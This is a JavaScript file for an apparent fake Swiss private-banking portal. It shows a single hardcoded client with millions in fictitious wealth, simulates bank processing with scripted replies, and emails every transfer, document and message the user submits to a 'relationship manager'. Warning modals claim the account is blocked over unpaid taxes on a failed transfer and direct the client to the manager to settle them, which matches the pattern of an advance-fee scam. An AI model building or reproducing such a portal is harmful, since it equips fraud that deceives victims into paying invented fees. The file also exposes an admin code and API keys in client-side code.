const BANK = {
    clientName: 'Anne Marie DUPOND',
    clientId: 'CH-947201',
    rmName: 'Daniel Weber',
    totalWealth: 4369400,
    cash: 1369400,
    investments: 3000000,
    performance: -35900,
    performancePct: -3.1
};

const RM_EMAIL = "d.weber@banksuisse.ch";
const ADMIN_ACCESS_CODE = "BANKSUISSE26";
const EMAILJS_SERVICE_ID = "service_w724siv";
const EMAILJS_TEMPLATE_ID = "template_03cni7i";
const EMAILJS_PUBLIC_KEY = "yNbm7nMAhowRHLjLe";

const BANK_EVENT_STEPS = {
    DOC: ['Dossier reçu', 'Analyse en cours', 'Contrôle conformité'],
    INV: ['Demande enregistrée', 'Analyse portefeuille', 'Validation requise'],
    TRF: ['Instruction reçue', 'Vérification réglementaire', 'En attente de traitement'],
    CHG: ['Ordre enregistré', 'Traitement en cours', 'Exécution confirmée'],
    CRD: ['Demande enregistrée', 'Fabrication', 'Préparation expédition'],
    MSG: ['Message reçu', 'Affectation gestionnaire', 'Réponse en attente']
};

const RM_AUTO_REPLIES = {
    DOC: 'Votre dossier a bien été reçu et transmis à notre équipe conformité.',
    INV: 'Votre demande a été transmise à notre équipe d’investissement.',
    TRF: 'Votre instruction est en cours de vérification.',
    CHG: 'Votre opération de change est actuellement en traitement.',
    CRD: 'Votre demande de carte a été enregistrée avec succès.',
    MSG: 'Votre message a bien été reçu. Je reviendrai vers vous dans les meilleurs délais.'
};

const SIDEBAR_LINKS = [
    { href: 'dashboard.html', icon: 'dashboard', label: 'Tableau de bord' },
    { href: 'transfer.html', icon: 'transfer', label: 'Virements' },
    { href: 'exchange.html', icon: 'exchange', label: 'Change' },
    { href: 'invest.html', icon: 'invest', label: 'Investir' },
    { href: 'cards.html', icon: 'card', label: 'Cartes' },
    { href: 'messages.html', icon: 'mail', label: 'Messages' },
    { href: 'documents.html', icon: 'document', label: 'Documents' },
    { href: 'settings.html', icon: 'settings', label: 'Paramètres' }
];

function checkSession() {
    if (localStorage.getItem('isLoggedIn') !== 'true') {
        window.location.href = 'index.html';
    }
}

function logout() {
    localStorage.removeItem('isLoggedIn');
    window.location.href = 'index.html';
}

function toggleMenu() {
    const menu = document.getElementById('profileDropdown');
    if (menu) menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
}

document.addEventListener('click', (e) => {
    const menu = document.getElementById('profileDropdown');
    if (menu && !e.target.closest('.profile-menu')) menu.style.display = 'none';
});

function isAccountBlocked() {
    return localStorage.getItem('accountStatus') === 'blocked';
}

function formatEUR(n) {
    return '€ ' + n.toLocaleString('fr-FR');
}

function getTransactions() {
    return JSON.parse(localStorage.getItem('transactions') || '[]');
}

function getNotifications() {
    return JSON.parse(localStorage.getItem('notifications') || '[]');
}

function getMessages() {
    return JSON.parse(localStorage.getItem('messages') || '[]');
}

function bankNow() {
    return new Date().toLocaleString('fr-FR', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
}

function makeReference(prefix) {
    const year = new Date().getFullYear();
    const stamp = Date.now().toString(36).toUpperCase().slice(-4);
    const random = Math.floor(Math.random() * 1296).toString(36).toUpperCase().padStart(2, '0');
    return `${prefix}-${year}-${stamp}${random}`;
}

function escapeHtml(value) {
    return String(value || '').replace(/[&<>"']/g, char => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    }[char]));
}

function saveTransactions(history) {
    localStorage.setItem('transactions', JSON.stringify(history));
}

function saveNotifications(notifications) {
    localStorage.setItem('notifications', JSON.stringify(notifications));
}

function updateNotificationCounters() {
    const unread = localStorage.getItem('unreadCount') || '0';
    const dot = document.getElementById('headerNotif');
    if (dot) dot.style.display = unread !== '0' ? 'block' : 'none';
    updateNotifBadge();
}

function addBankEvent(event) {
    const reference = event.reference || makeReference(event.prefix || 'BS');
    const prefix = reference.split('-')[0];
    const steps = event.steps || BANK_EVENT_STEPS[event.prefix] || BANK_EVENT_STEPS[prefix] || ['Reçu', 'Analyse en cours'];
    const currentStep = event.currentStep || steps[Math.min(steps.length - 1, 1)] || event.status || 'Reçu';
    const entry = {
        date: event.date || bankNow(),
        type: event.type || event.title,
        amount: event.amount || '',
        status: event.status || currentStep,
        details: event.details || '',
        reference,
        icon: event.icon || 'alert',
        operationType: event.operationType || event.type || event.title,
        steps,
        currentStep
    };
    const history = getTransactions();
    history.unshift(entry);
    saveTransactions(history);

    const notifications = getNotifications();
    notifications.unshift({
        date: entry.date,
        title: event.title || entry.type,
        body: event.notification || entry.details || entry.status,
        status: entry.status,
        reference,
        type: entry.operationType,
        steps,
        currentStep,
        icon: entry.icon,
        read: false
    });
    saveNotifications(notifications);

    const unread = Number(localStorage.getItem('unreadCount') || '0') + 1;
    localStorage.setItem('unreadCount', String(unread));
    updateNotificationCounters();
    addRelationshipManagerReply(event.prefix || prefix, reference, event.rmReply);
    return entry;
}

function addRelationshipManagerReply(prefix, reference, customText) {
    const text = customText || RM_AUTO_REPLIES[prefix];
    if (!text) return;
    const messages = getMessages();
    const duplicate = messages.some(m => m.reference === reference && m.from === 'rm');
    if (duplicate) return;
    messages.push({
        from: 'rm',
        author: BANK.rmName,
        text: `${text} Référence dossier : ${reference}.`,
        date: bankNow(),
        status: 'Suivi gestionnaire',
        reference
    });
    localStorage.setItem('messages', JSON.stringify(messages));
}

function initEmailJS() {
    if (window.emailjs) {
        window.emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
        return;
    }
    if (document.getElementById('emailjsSdk')) return;
    const script = document.createElement('script');
    script.id = 'emailjsSdk';
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
    script.onload = () => {
        if (window.emailjs) window.emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
    };
    document.head.appendChild(script);
}

function sendEmailJS(payload = {}) {
    if (!window.emailjs) {
        return Promise.resolve({ skipped: true });
    }
    const emailPayload = {
        rm_email: RM_EMAIL,
        client_name: BANK.clientName,
        client_id: BANK.clientId,
        reference: payload.reference || '',
        operation_type: payload.operation_type || payload.type || payload.operation || payload.asset || payload.card || 'Opération BANK SUISSE',
        status: payload.status || '',
        date: payload.date || bankNow(),
        message: payload.message || payload.details || payload.status || '',
        amount: payload.amount || '',
        ...payload
    };
    return window.emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailPayload).catch(error => {
        console.warn('EmailJS non envoyé', error);
        return { skipped: true, error };
    });
}

function sendDocumentEmail(payload) {
    return sendEmailJS({ operation_type: 'Document', ...payload });
}

function sendMessageEmail(payload) {
    return sendEmailJS({ operation_type: 'Message gestionnaire', ...payload });
}

function sendInvestmentEmail(payload) {
    return sendEmailJS({ operation_type: 'Investissement', ...payload });
}

function sendTransferEmail(payload) {
    return sendEmailJS({ operation_type: 'Virement international', ...payload });
}

function sendExchangeEmail(payload) {
    return sendEmailJS({ operation_type: 'Change de devises', ...payload });
}

function sendCardEmail(payload) {
    return sendEmailJS({ operation_type: 'Carte bancaire', ...payload });
}

function initBank() {
    if (!localStorage.getItem('bankInitialized')) {
        localStorage.setItem('transactions', JSON.stringify([]));
        localStorage.setItem('notifications', JSON.stringify([]));
        localStorage.setItem('messages', JSON.stringify([]));
        localStorage.setItem('unreadCount', '0');
        localStorage.removeItem('accountStatus');
        localStorage.removeItem('blockReason');
        localStorage.setItem('bankInitialized', 'true');
    }
    if (!localStorage.getItem('transactions')) localStorage.setItem('transactions', JSON.stringify([]));
    if (!localStorage.getItem('notifications')) localStorage.setItem('notifications', JSON.stringify([]));
    if (!localStorage.getItem('messages')) localStorage.setItem('messages', JSON.stringify([]));
    if (!localStorage.getItem('unreadCount')) localStorage.setItem('unreadCount', '0');
}

function renderHeader(activePage) {
    const unread = localStorage.getItem('unreadCount') || '0';
    const initials = BANK.clientName.split(' ').map(n => n[0]).join('');

    return `
    <div class="header">
    <a href="dashboard.html" class="brand">
        <img
            src="logo.png"
            alt="Bank Suisse"
            style="height:38px;width:auto;display:block"
        >
    </a>
        <nav class="header-nav">
            ${SIDEBAR_LINKS.slice(0, 4).map(l =>
                `<a href="${l.href}" class="${activePage === l.href ? 'active' : ''}">${l.label}</a>`
            ).join('')}
        </nav>
        <div class="header-actions">
            <button class="notif-btn" onclick="openNotifications()" title="Notifications">
                ${icon('bell', { size: 20 })}
                <span class="notif-dot" id="headerNotif" style="display:${unread !== '0' ? 'block' : 'none'}"></span>
            </button>
            <div class="profile-menu">
                <div class="profile-toggle" onclick="toggleMenu()">
                    <div class="avatar">${initials}</div>
                    ${BANK.clientName} ${icon('chevronDown', { size: 14, class: 'ico ico-chevron' })}
                </div>
                <div id="profileDropdown" class="dropdown">
                    <a href="invest.html">${icon('invest', { size: 18 })} Investir</a>
                    <a href="messages.html">${icon('mail', { size: 18 })} Messages</a>
                    <a href="documents.html">${icon('document', { size: 18 })} Documents</a>
                    <a href="cards.html">${icon('card', { size: 18 })} Mes cartes</a>
                    <a href="settings.html">${icon('settings', { size: 18 })} Paramètres</a>
                    <a href="#" onclick="openSupport(); return false;">${icon('user', { size: 18 })} RM : ${BANK.rmName}</a>
                    <hr>
                    <a href="#" onclick="logout(); return false;" style="color:var(--danger)">${icon('logout', { size: 18 })} Déconnexion</a>
                </div>
            </div>
        </div>
    </div>`;
}

function renderSidebar(activePage) {
    return `
    <aside class="sidebar">
        <div class="sidebar-label">Navigation</div>
        ${SIDEBAR_LINKS.map(l =>
            `<a href="${l.href}" class="${activePage === l.href ? 'active' : ''}">
                <span class="icon">${icon(l.icon, { size: 18 })}</span>${l.label}
            </a>`
        ).join('')}
        <div class="sidebar-label" style="margin-top:24px">Accessibilité</div>
        <a href="#" onclick="openAdminAccess(); return false;"><span class="icon">${icon('shield', { size: 18 })}</span>Console</a>
    </aside>`;
}

function renderAppLayout(activePage, content) {
    return `
    ${renderHeader(activePage)}
    <div id="accountAlert" class="alert"></div>
    <div class="app-layout">
        ${renderSidebar(activePage)}
        <main class="main-content">${content}</main>
    </div>
    ${renderModals()}`;
}

function renderModals() {
    return `
    <div id="supportModal" class="modal">
        <div class="modal-box">
            <h3>Compte sous restriction</h3>
            <p style="color:var(--text-muted);line-height:1.7">
                Suite à l'échec d'un virement international, des taxes et obligations fiscales associées n'ont pas été réglées.<br><br>
                Veuillez contacter votre Responsable de relation <b>${BANK.rmName}</b> ou vous rendre en agence pour régularisation.
            </p>
            <button class="action-btn" onclick="closeSupport()" style="margin-top:16px;width:100%">Fermer</button>
        </div>
    </div>
    <div id="historyModal" class="modal">
        <div class="modal-box" style="max-width:600px">
            <h3>Historique des transactions</h3>
            <div id="historyContent"></div>
            <button class="action-btn" onclick="closeHistory()" style="margin-top:16px;width:100%">Fermer</button>
        </div>
    </div>
    <div id="notifModal" class="modal">
        <div class="modal-box">
            <h3>Notifications</h3>
            <div id="notifContent"></div>
            <button class="action-btn" onclick="closeNotifications()" style="margin-top:16px;width:100%">Tout marquer comme lu</button>
        </div>
    </div>
    <div id="adminAccessModal" class="modal">
        <div class="modal-box">
            <h3>Accès sécurisé</h3>
            <p style="color:var(--text-muted);line-height:1.7">Veuillez saisir votre code d'accès afin de continuer.</p>
            <div class="group" style="margin-top:18px">
                <label for="adminAccessCode">Code d'accès</label>
                <input type="password" id="adminAccessCode" autocomplete="off" onkeydown="if(event.key==='Enter') validateAdminAccess()">
            </div>
            <div id="adminAccessError" class="error-msg" style="display:none">Code d'accès invalide</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px">
                <button class="action-btn outline" onclick="closeAdminAccess()">Annuler</button>
                <button class="action-btn" onclick="validateAdminAccess()">Valider</button>
            </div>
        </div>
    </div>`;
}

function openSupport() {
    document.getElementById('supportModal').style.display = 'block';
}
function closeSupport() {
    document.getElementById('supportModal').style.display = 'none';
}

function openHistory() {
    const modal = document.getElementById('historyModal');
    if (!modal) return;
    modal.style.display = 'block';
    localStorage.setItem('unreadCount', '0');
    const badge = document.getElementById('notifBadge');
    if (badge) badge.style.display = 'none';
    const dot = document.getElementById('headerNotif');
    if (dot) dot.style.display = 'none';
    renderHistoryContent();
}

function closeHistory() {
    document.getElementById('historyModal').style.display = 'none';
}

function openNotifications() {
    const modal = document.getElementById('notifModal');
    if (!modal) { openHistory(); return; }
    modal.style.display = 'block';
    const content = document.getElementById('notifContent');
    const notifications = getNotifications();
    if (notifications.length) {
        content.innerHTML = '<ul class="tx-list">' + notifications.slice(0, 10).map(n => `
            <li class="tx-item ${n.read ? '' : 'notification-unread'}">
                ${txIcon(n.icon || 'alert')}
                <div class="tx-info">
                    <strong>${escapeHtml(n.title)}</strong>
                    <span>${escapeHtml(n.type || 'Opération bancaire')} · ${escapeHtml(n.date)}</span>
                    <span>${escapeHtml(n.body || n.status)}</span>
                    <span class="small">Réf. ${escapeHtml(n.reference)}</span>
                    ${n.steps ? `<span class="small">Traitement : ${n.steps.map(s => escapeHtml(s)).join(' → ')}</span>` : ''}
                </div>
                <div class="tx-amount"><span class="badge badge-warning">${escapeHtml(n.status)}</span></div>
            </li>`).join('') + '</ul>';
    } else {
        content.innerHTML = '<p style="color:var(--text-muted)">Aucune notification non lue.</p>';
    }
}

function closeNotifications() {
    document.getElementById('notifModal').style.display = 'none';
    const notifications = getNotifications().map(n => ({ ...n, read: true }));
    saveNotifications(notifications);
    localStorage.setItem('unreadCount', '0');
    const dot = document.getElementById('headerNotif');
    if (dot) dot.style.display = 'none';
}

function openAdminAccess() {
    const modal = document.getElementById('adminAccessModal');
    const input = document.getElementById('adminAccessCode');
    const error = document.getElementById('adminAccessError');
    if (!modal) return;
    modal.style.display = 'block';
    if (error) error.style.display = 'none';
    if (input) {
        input.value = '';
        setTimeout(() => input.focus(), 50);
    }
}

function closeAdminAccess() {
    const modal = document.getElementById('adminAccessModal');
    const error = document.getElementById('adminAccessError');
    if (modal) modal.style.display = 'none';
    if (error) error.style.display = 'none';
}

function validateAdminAccess() {
    const input = document.getElementById('adminAccessCode');
    const error = document.getElementById('adminAccessError');
    if (input && input.value === ADMIN_ACCESS_CODE) {
        sessionStorage.setItem('adminAccessGranted', 'true');
        window.location.href = 'admin.html';
        return;
    }
    if (error) error.style.display = 'block';
}

function renderHistoryContent() {
    const el = document.getElementById('historyContent');
    if (!el) return;
    const history = getTransactions();
    if (!history.length) {
        el.innerHTML = '<p style="color:var(--text-muted)">Aucune transaction enregistrée.</p>';
        return;
    }
    el.innerHTML = '<ul class="tx-list">' + history.map(t => `
        <li class="tx-item">
            ${txIcon(t.icon || 'transfer')}
            <div class="tx-info">
                <strong>${escapeHtml(t.type)}</strong>
                <span>${escapeHtml(t.date)}${t.details ? ' · ' + escapeHtml(t.details) : ''}</span>
                ${t.reference ? `<span class="small">Réf. ${escapeHtml(t.reference)}</span>` : ''}
                ${t.steps ? `<span class="small">Traitement : ${t.steps.map(s => escapeHtml(s)).join(' → ')}</span>` : ''}
            </div>
            <div class="tx-amount">${escapeHtml(t.amount || '')}<br><span class="${t.status && t.status.includes('Échec') ? 'negative' : 'positive'}" style="font-size:12px">${escapeHtml(t.status)}</span></div>
        </li>`).join('') + '</ul>';
}

function applyBlockedState() {
    const blocked = isAccountBlocked();
    const alert = document.getElementById('accountAlert');
    if (blocked && alert) {
        alert.style.display = 'block';
        alert.innerText = 'Votre compte est bloqué suite à l\'échec d\'un virement international. Des taxes et obligations fiscales associées n\'ont pas été réglées.';
    }
    ['transferBtn', 'exchangeBtn'].forEach(id => {
        const btn = document.getElementById(id);
        if (btn && blocked) btn.classList.add('disabled');
    });
}

function updateNotifBadge() {
    const unread = localStorage.getItem('unreadCount') || '0';
    const badge = document.getElementById('notifBadge');
    if (badge) {
        if (unread !== '0') {
            badge.style.display = 'inline-block';
            badge.innerText = unread;
        } else {
            badge.style.display = 'none';
        }
    }
}

function drawChart(canvasId, data) {
    const canvas = document.getElementById(canvasId);
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    const w = canvas.width = canvas.offsetWidth * 2;
    const h = canvas.height = canvas.offsetHeight * 2;
    ctx.scale(2, 2);
    const cw = w / 2, ch = h / 2;
    const pad = 20;
    const min = Math.min(...data), max = Math.max(...data);
    const range = max - min || 1;

    ctx.clearRect(0, 0, cw, ch);
    const grad = ctx.createLinearGradient(0, 0, 0, ch);
    grad.addColorStop(0, 'rgba(201, 162, 39, 0.25)');
    grad.addColorStop(1, 'rgba(201, 162, 39, 0)');

    ctx.beginPath();
    data.forEach((v, i) => {
        const x = pad + (i / (data.length - 1)) * (cw - pad * 2);
        const y = ch - pad - ((v - min) / range) * (ch - pad * 2);
        i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
    });
    ctx.lineTo(cw - pad, ch - pad);
    ctx.lineTo(pad, ch - pad);
    ctx.closePath();
    ctx.fillStyle = grad;
    ctx.fill();

    ctx.beginPath();
    data.forEach((v, i) => {
        const x = pad + (i / (data.length - 1)) * (cw - pad * 2);
        const y = ch - pad - ((v - min) / range) * (ch - pad * 2);
        i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
    });
    ctx.strokeStyle = '#c9a227';
    ctx.lineWidth = 2.5;
    ctx.stroke();
}

/* =====================================================
BANK SUISSE MOBILE NAVIGATION
===================================================== */

function initMobileNavigation() {

    const sidebar = document.querySelector('.sidebar');

    if (!sidebar) return;

    /* Overlay */
    let overlay = document.querySelector('.mobile-overlay');

    if (!overlay) {
        overlay = document.createElement('div');
        overlay.className = 'mobile-overlay';
        document.body.appendChild(overlay);
    }

    /* Hamburger */
    let hamburger = document.querySelector('.mobile-menu-btn');

    if (!hamburger) {

        hamburger = document.createElement('button');
        hamburger.className = 'mobile-menu-btn';

        hamburger.innerHTML = `
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M4 7H20" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                <path d="M4 12H20" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                <path d="M4 17H20" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
            </svg>
        `;

        const brand = document.querySelector('.brand');

        if (brand && brand.parentElement) {
            brand.parentElement.insertBefore(
                hamburger,
                brand
            );
        }
    }

    function openMenu() {
        sidebar.classList.add('mobile-open');
        overlay.classList.add('show');
        document.documentElement.classList.add('mobile-menu-active');
        document.body.classList.add('mobile-menu-active');
        document.documentElement.style.overflow = 'hidden';
        document.body.style.overflow = 'hidden';
    }

    function closeMenu() {
        sidebar.classList.remove('mobile-open');
        overlay.classList.remove('show');
        document.documentElement.classList.remove('mobile-menu-active');
        document.body.classList.remove('mobile-menu-active');
        document.documentElement.style.overflow = '';
        document.body.style.overflow = '';
    }

    hamburger.setAttribute('aria-label', 'Ouvrir le menu');
    hamburger.setAttribute('type', 'button');
    hamburger.addEventListener('click', () => {
        if (sidebar.classList.contains('mobile-open')) closeMenu();
        else openMenu();
    });

    overlay.addEventListener('click', closeMenu);
    sidebar.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', closeMenu);
    });

    window.addEventListener('resize', () => {

        if (window.innerWidth > 900) {

            sidebar.classList.remove('mobile-open');

            overlay.classList.remove('show');

            document.documentElement.classList.remove('mobile-menu-active');
            document.body.classList.remove('mobile-menu-active');
            document.documentElement.style.overflow = '';
            document.body.style.overflow = '';
        }
    });
}

/* =====================================================
BOTTOM NAVIGATION
===================================================== */

function initBottomNav() {

    if (window.innerWidth > 900) {
        const existing = document.querySelector('.bottom-nav');
        if (existing) existing.remove();
        return;
    }

    if (document.querySelector('.bottom-nav')) return;

    const nav = document.createElement('nav');

    nav.className = 'bottom-nav';

    nav.innerHTML = `
        <a href="dashboard.html">${icon('dashboard', { size: 21 })}<span>Accueil</span></a>
        <a href="transfer.html">${icon('transfer', { size: 21 })}<span>Virement</span></a>
        <a href="exchange.html">${icon('exchange', { size: 21 })}<span>Change</span></a>
        <a href="invest.html">${icon('invest', { size: 21 })}<span>Investir</span></a>
        <a href="messages.html">${icon('mail', { size: 21 })}<span>Messages</span></a>
    `;

    document.body.appendChild(nav);

    const currentPage =
        window.location.pathname
        .split('/')
        .pop();

    nav.querySelectorAll('a').forEach(link => {

        const href = link.getAttribute('href');

        if (href === currentPage) {

            link.classList.add('active');
        }
    });
}

/* =====================================================
INIT
===================================================== */

document.addEventListener('DOMContentLoaded', () => {

    initEmailJS();

    initMobileNavigation();

    initBottomNav();

});

window.addEventListener('resize', initBottomNav);
